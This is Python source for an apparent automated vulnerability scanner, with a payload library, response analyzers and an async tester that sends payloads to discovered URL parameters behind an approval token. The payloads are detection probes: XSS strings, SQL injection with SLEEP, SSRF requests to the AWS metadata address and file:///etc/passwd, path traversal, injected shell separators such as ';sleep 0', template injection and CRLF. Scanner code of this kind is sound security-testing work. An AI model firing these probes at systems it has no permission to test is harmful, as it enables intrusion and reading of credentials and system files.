"""Intelligent payload generator and tester.
Creates context-aware payloads based on what the explorer found.
Tests them one at a time (with governance approval).
Analyzes responses intelligently.
No external tools — pure Python logic."""

import asyncio
import logging
import re
import urllib.parse
from dataclasses import dataclass, field
from typing import Optional

logger = logging.getLogger("ygb.hunter.payload")


@dataclass
class Payload:
    payload_id: str
    vuln_type: str  # xss, sqli, ssrf, idor, rce, ...
    value: str  # the actual payload string
    context: str  # url_param, form_field, header, body
    encoding: str = "none"  # none, url, html, base64, unicode
    notes: str = ""
    confidence_trigger: float = 0.0  # how confident we are this will trigger


@dataclass
class PayloadTestResult:
    payload: "Payload"
    endpoint_url: str
    param_name: str
    response_status: int
    response_time_ms: float
    triggered: bool  # did we detect the vulnerability?
    confidence: float  # 0.0 - 1.0
    evidence: dict  # what we saw that triggered
    baseline_diff: dict  # difference from baseline response
    request_id: str
    needs_confirmation: bool = True  # always confirm before reporting


class PayloadLibrary:
    """Library of payloads for each vulnerability type.
    Ordered from least intrusive to most intrusive.
    All payloads are detection-only — not exploitation."""

    XSS = [
        Payload(
            "x001",
            "xss",
            "<ygb-probe>",
            "url_param",
            notes="unique tag probe",
            confidence_trigger=0.95,
        ),
        Payload("x002", "xss", "\"'><ygb>", "url_param", notes="basic break-out"),
        Payload("x003", "xss", "javascript:void(0)//", "url_param", notes="js proto"),
        Payload(
            "x004",
            "xss",
            "<%2Fscript><script>YGB_XSS<\/script>",
            "url_param",
            encoding="url",
            notes="encoded script",
        ),
        Payload(
            "x005",
            "xss",
            "' onfocus=YGB_XSS autofocus '",
            "url_param",
            notes="event handler",
        ),
        Payload(
            "x006", "xss", "<img src=x onerror=YGB_XSS>", "url_param", notes="img onerror"
        ),
        Payload(
            "x007",
            "xss",
            "${YGB_SSTI}",
            "url_param",
            notes="template literal (also SSTI test)",
        ),
    ]

    SQLI = [
        Payload("s001", "sqli", "'", "url_param", notes="single quote — look for SQL error"),
        Payload(
            "s002", "sqli", "''", "url_param", notes="escaped quote — no error = possible"
        ),
        Payload("s003", "sqli", "1 AND 1=1", "url_param", notes="boolean true"),
        Payload(
            "s004",
            "sqli",
            "1 AND 1=2",
            "url_param",
            notes="boolean false — diff response = sqli",
        ),
        Payload("s005", "sqli", "1' AND '1'='1", "url_param", notes="string context boolean"),
        Payload(
            "s006",
            "sqli",
            "1 AND SLEEP(2)",
            "url_param",
            confidence_trigger=0.9,
            notes="time-based — look for 2s delay",
        ),
        Payload(
            "s007", "sqli", "1' AND SLEEP(2)--", "url_param", notes="string context time-based"
        ),
        Payload("s008", "sqli", "1 UNION SELECT NULL--", "url_param", notes="union probe"),
    ]

    SSRF = [
        Payload(
            "ssrf001",
            "ssrf",
            "http://169.254.169.254/",
            "url_param",
            confidence_trigger=0.98,
            notes="AWS metadata",
        ),
        Payload(
            "ssrf002",
            "ssrf",
            "http://169.254.169.254/latest/meta-data/",
            "url_param",
            notes="AWS metadata v1",
        ),
        Payload("ssrf003", "ssrf", "http://localhost/", "url_param", notes="loopback"),
        Payload("ssrf004", "ssrf", "http://127.0.0.1/", "url_param", notes="loopback IP"),
        Payload("ssrf005", "ssrf", "http://0.0.0.0/", "url_param", notes="zero address"),
        Payload("ssrf006", "ssrf", "http://[::1]/", "url_param", notes="IPv6 loopback"),
        Payload("ssrf007", "ssrf", "file:///etc/passwd", "url_param", notes="file proto"),
        Payload(
            "ssrf008", "ssrf", "dict://localhost:11211/", "url_param", notes="memcached SSRF"
        ),
    ]

    IDOR = [
        Payload("i001", "idor", "0", "url_param", notes="replace with 0"),
        Payload("i002", "idor", "1", "url_param", notes="replace with 1"),
        Payload("i003", "idor", "-1", "url_param", notes="negative id"),
        Payload("i004", "idor", "999999", "url_param", notes="very large id"),
        Payload("i005", "idor", "../../../etc/passwd", "url_param", notes="path traversal"),
        Payload("i006", "idor", "../../admin", "url_param", notes="directory traversal"),
        Payload("i007", "idor", "0x1", "url_param", notes="hex id"),
        Payload("i008", "idor", "00000001", "url_param", notes="padded id"),
    ]

    PATH_TRAVERSAL = [
        Payload("pt001", "path_traversal", "../etc/passwd", "url_param"),
        Payload("pt002", "path_traversal", "..%2Fetc%2Fpasswd", "url_param", encoding="url"),
        Payload("pt003", "path_traversal", "....//....//etc/passwd", "url_param"),
        Payload(
            "pt004",
            "path_traversal",
            "..%252Fetc%252Fpasswd",
            "url_param",
            encoding="url",
            notes="double encoded",
        ),
        Payload("pt005", "path_traversal", "/etc/passwd", "url_param"),
        Payload("pt006", "path_traversal", "C:\\Windows\\win.ini", "url_param", notes="windows"),
    ]

    RCE_DETECT = [
        Payload(
            "rce001",
            "rce",
            "$(sleep 0)",
            "url_param",
            notes="command sub — no delay expected = detection-only",
        ),
        Payload("rce002", "rce", "`sleep 0`", "url_param", notes="backtick sub"),
        Payload("rce003", "rce", "||sleep 0", "url_param", notes="OR command"),
        Payload("rce004", "rce", ";sleep 0", "url_param", notes="semicolon cmd"),
        Payload("rce005", "rce", "{{7*7}}", "url_param", notes="SSTI — look for 49 in response"),
        Payload("rce006", "rce", "${7*7}", "url_param", notes="SSTI — alternate"),
        Payload("rce007", "rce", "<%= 7*7 %>", "url_param", notes="ERB SSTI"),
    ]

    OPEN_REDIRECT = [
        Payload("or001", "open_redirect", "https://evil.ygb-test.com", "url_param"),
        Payload("or002", "open_redirect", "//evil.ygb-test.com", "url_param"),
        Payload("or003", "open_redirect", "/\\evil.ygb-test.com", "url_param"),
        Payload("or004", "open_redirect", "https:evil.ygb-test.com", "url_param"),
    ]

    CRLF = [
        Payload("crlf001", "crlf", "%0d%0aX-Injected: ygb-test", "url_param", encoding="url"),
        Payload("crlf002", "crlf", "\r\nX-Injected: ygb-test", "url_param"),
    ]

    @classmethod
    def get_for_type(cls, vuln_type: str) -> list:
        MAP = {
            "xss": cls.XSS,
            "sqli": cls.SQLI,
            "ssrf": cls.SSRF,
            "idor": cls.IDOR,
            "path_traversal": cls.PATH_TRAVERSAL,
            "rce": cls.RCE_DETECT,
            "ssti": cls.RCE_DETECT,
            "open_redirect": cls.OPEN_REDIRECT,
            "crlf": cls.CRLF,
        }
        return MAP.get(vuln_type, [])

    @classmethod
    def get_all_types(cls) -> list[str]:
        return ["xss", "sqli", "ssrf", "idor", "path_traversal", "rce", "open_redirect", "crlf"]


class ResponseAnalyzer:
    """Analyzes HTTP responses to detect if payload triggered."""

    def analyze(
        self,
        vuln_type: str,
        payload: "Payload",
        response: "HTTPResponse",
        baseline: Optional["HTTPResponse"] = None,
    ) -> dict:
        """Determine if the payload triggered a vulnerability.
        Returns {"triggered": bool, "confidence": float, "evidence": dict}"""
        body = response.body
        body_lower = body.lower()
        headers = {k.lower(): v.lower() for k, v in response.headers.items()}

        if vuln_type == "xss":
            return self._analyze_xss(payload, response, body_lower)
        elif vuln_type == "sqli":
            return self._analyze_sqli(response, body_lower, baseline)
        elif vuln_type == "ssrf":
            return self._analyze_ssrf(response, body, body_lower)
        elif vuln_type == "idor":
            return self._analyze_idor(response, baseline)
        elif vuln_type == "path_traversal":
            return self._analyze_path_traversal(body)
        elif vuln_type in ("rce", "ssti"):
            return self._analyze_rce_ssti(payload, body)
        elif vuln_type == "open_redirect":
            return self._analyze_redirect(response)
        elif vuln_type == "crlf":
            return self._analyze_crlf(response)

        return {"triggered": False, "confidence": 0.0, "evidence": {}}

    def _analyze_xss(self, payload, resp, body_lower) -> dict:
        probe = "ygb-probe" if "ygb-probe" in payload.value.lower() else "ygb"
        if probe in body_lower:
            return {
                "triggered": True,
                "confidence": 0.85,
                "evidence": {
                    "reflected_payload": payload.value,
                    "in_body": True,
                    "content_type": resp.content_type,
                },
            }

        # Check if reflected in unsafe context
        if payload.value.lower().replace("<", "").replace(">", "") in body_lower:
            return {
                "triggered": True,
                "confidence": 0.6,
                "evidence": {"partial_reflection": True},
            }

        return {"triggered": False, "confidence": 0.0, "evidence": {}}

    def _analyze_sqli(self, resp, body_lower, baseline) -> dict:
        SQL_ERRORS = [
            "sql syntax",
            "mysql_fetch",
            "ora-01756",
            "sqlite3",
            "pg::syntaxerror",
            "unclosed quotation mark",
            "you have an error in your sql",
            "warning: mysql",
            "sqlexception",
            "jdbc",
            "syntax error",
            "mysql error",
        ]

        for err in SQL_ERRORS:
            if err in body_lower:
                return {
                    "triggered": True,
                    "confidence": 0.90,
                    "evidence": {"error_string": err, "status": resp.status_code},
                }

        # Time-based: check if response was delayed
        if resp.elapsed_ms > 1800:  # 1.8s+ indicates sleep(2) likely worked
            return {
                "triggered": True,
                "confidence": 0.75,
                "evidence": {"timing_ms": resp.elapsed_ms, "type": "time_based"},
            }

        # Boolean: response significantly different from baseline
        if baseline:
            diff = resp.diff_from(baseline)
            if diff["length_diff"] > 500 or diff["status_diff"]:
                return {
                    "triggered": True,
                    "confidence": 0.65,
                    "evidence": {"boolean_diff": diff, "type": "boolean"},
                }

        return {"triggered": False, "confidence": 0.0, "evidence": {}}

    def _analyze_ssrf(self, resp, body, body_lower) -> dict:
        AWS_INDICATORS = [
            "ami-id",
            "instance-id",
            "local-ipv4",
            "iam/security-credentials",
            "169.254.169.254",
            "169.254.170.2",
            "aws",
            "ec2",
        ]

        for indicator in AWS_INDICATORS:
            if indicator in body_lower:
                return {
                    "triggered": True,
                    "confidence": 0.95,
                    "evidence": {"indicator": indicator, "type": "aws_metadata"},
                }

        # Internal IP in response
        import re

        ips = re.findall(
            r"(?:10\.\d+\.\d+\.\d+|192\.168\.\d+\.\d+|172\.\d+\.\d+\.\d+)", body
        )
        if ips:
            return {
                "triggered": True,
                "confidence": 0.80,
                "evidence": {"internal_ips": ips, "type": "internal_network"},
            }

        if resp.status_code == 200 and len(body) > 100:
            return {
                "triggered": True,
                "confidence": 0.50,
                "evidence": {"got_response": True, "status": 200},
            }

        return {"triggered": False, "confidence": 0.0, "evidence": {}}

    def _analyze_idor(self, resp, baseline) -> dict:
        if baseline is None:
            return {"triggered": False, "confidence": 0.0, "evidence": {}}

        if resp.status_code == 200 and baseline.status_code == 403:
            return {
                "triggered": True,
                "confidence": 0.85,
                "evidence": {"original_403_became_200": True},
            }

        diff = resp.diff_from(baseline)
        if diff["length_diff"] > 200 and resp.status_code == 200:
            return {
                "triggered": True,
                "confidence": 0.60,
                "evidence": {"different_content": True, "diff": diff},
            }

        return {"triggered": False, "confidence": 0.0, "evidence": {}}

    def _analyze_path_traversal(self, body) -> dict:
        UNIX_INDICATORS = [
            "root:x:",
            "root:0:",
            "/bin/bash",
            "/bin/sh",
            "daemon:x:",
            "nobody:x:",
        ]
        WIN_INDICATORS = [
            "[boot loader]",
            "[operating systems]",
            "for 16-bit app support",
            "[fonts]",
        ]

        for ind in UNIX_INDICATORS + WIN_INDICATORS:
            if ind.lower() in body.lower():
                return {
                    "triggered": True,
                    "confidence": 0.97,
                    "evidence": {"indicator": ind, "type": "file_read"},
                }

        return {"triggered": False, "confidence": 0.0, "evidence": {}}

    def _analyze_rce_ssti(self, payload, body) -> dict:
        # SSTI: look for math result
        if "7*7" in payload.value or "{{" in payload.value:
            if "49" in body:
                return {
                    "triggered": True,
                    "confidence": 0.92,
                    "evidence": {"math_result": "7*7=49", "type": "ssti"},
                }

        return {"triggered": False, "confidence": 0.0, "evidence": {}}

    def _analyze_redirect(self, resp) -> dict:
        if resp.redirects and "evil.ygb-test.com" in str(resp.redirects):
            return {
                "triggered": True,
                "confidence": 0.95,
                "evidence": {"redirected_to": resp.redirects[-1]},
            }

        return {"triggered": False, "confidence": 0.0, "evidence": {}}

    def _analyze_crlf(self, resp) -> dict:
        if "x-injected" in {k.lower() for k in resp.headers}:
            return {
                "triggered": True,
                "confidence": 0.98,
                "evidence": {"injected_header": "X-Injected: ygb-test"},
            }

        return {"triggered": False, "confidence": 0.0, "evidence": {}}


class IntelligentPayloadTester:
    """Tests payloads against discovered endpoints.
    Gets baseline first. Tests one payload at a time.
    Every payload send requires governance approval."""

    def __init__(self, http: "SmartHTTPEngine"):
        self._http = http
        self._analyzer = ResponseAnalyzer()
        self._library = PayloadLibrary()

    async def get_baseline(
        self, url: str, param: str, original_value: str = "1"
    ) -> Optional["HTTPResponse"]:
        """Get baseline response with normal value."""
        import urllib.parse
        from backend.hunter.http_engine import HTTPRequest

        parsed = urllib.parse.urlparse(url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        params[param] = original_value
        new_query = urllib.parse.urlencode(params)
        test_url = urllib.parse.urlunparse(
            (parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, "")
        )

        try:
            return await self._http.send(HTTPRequest("GET", test_url, timeout=10.0))
        except Exception:
            return None

    async def test_payload(
        self,
        url: str,
        param: str,
        payload: "Payload",
        approval_token: str,
        baseline: Optional["HTTPResponse"] = None,
    ) -> "PayloadTestResult":
        """Test one payload against one parameter.
        Requires explicit approval_token — human must approve."""
        import urllib.parse
        from backend.hunter.http_engine import HTTPRequest, HTTPResponse

        parsed = urllib.parse.urlparse(url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        params[param] = payload.value
        new_query = urllib.parse.urlencode(params)
        test_url = urllib.parse.urlunparse(
            (parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, "")
        )

        req = HTTPRequest("GET", test_url, is_payload_request=True)
        resp = await self._http.send(req, approved=bool(approval_token))

        analysis = self._analyzer.analyze(payload.vuln_type, payload, resp, baseline)
        diff = resp.diff_from(baseline) if baseline else {}

        return PayloadTestResult(
            payload=payload,
            endpoint_url=url,
            param_name=param,
            response_status=resp.status_code,
            response_time_ms=resp.elapsed_ms,
            triggered=analysis["triggered"],
            confidence=analysis["confidence"],
            evidence=analysis["evidence"],
            baseline_diff=diff,
            request_id=resp.request_id,
        )
